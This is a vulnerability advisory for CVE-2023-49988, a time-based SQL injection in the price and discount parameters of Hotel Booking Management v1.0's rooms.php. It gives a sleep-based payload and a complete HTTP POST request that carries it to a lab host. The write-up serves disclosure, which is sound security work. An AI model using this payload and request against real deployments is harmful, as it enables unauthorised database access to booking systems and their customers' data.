# CVE-2023-49988
# Hotel Booking Management v1.0 - SQL Injection Vulnerability in the "npss" parameter at rooms.php

**Description**: A SQL Injection vulnerability exists in version 1 of the Hotel Booking Management. A malicious attacker can issue SQL commands to the MySQL database when editing the prices and discounts of lodging options through the vulnerable parameters npss, dpss, npsd, dpsd, npds, dpds, npdd, dpdd, npdst, or dpdst.  
  
**Vulnerable Product Version**: Hotel Booking Management v1.0  
**CVE Author**: Geraldo Alcântara  
**Date**: 28/11/2023  
**Confirmed on**: 19/12/2023  
**CVE**: CVE-2023-49988     
**Tested on**: Windows  
### Steps to reproduce:  
To exploit this vulnerability, an attacker can navigate to /HotelBookingManagement-main/rooms.php. By injecting an SQL payload into parameters such as npss, dpss, npsd, dpsd, npds, dpds, npdd, dpdd, npdst, or dpdst while modifying the prices and discounts of lodging options, the attacker can compromise the system.
**Payload**: (select*from(select(sleep(5)))a)
### Request:  
```
POST /HotelBookingManagement-main/rooms.php HTTP/1.1
Host: 192.168.68.148
Content-Length: 127
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.68.148
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.68.148/HotelBookingManagement-main/rooms.php
Accept-Encoding: gzip, deflate, br
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=aih2rvevdrpegiqt8nlstav7am
Connection: close

npss=(select*from(select(sleep(5)))a)&dpss=2&npsd=800&dpsd=2&npds=1100&dpds=3&npdd=1500&dpdd=4&npdst=2000&dpdst=13&updateRooms=
```
Discoverer(s)/Credits:
Geraldo Alcântara
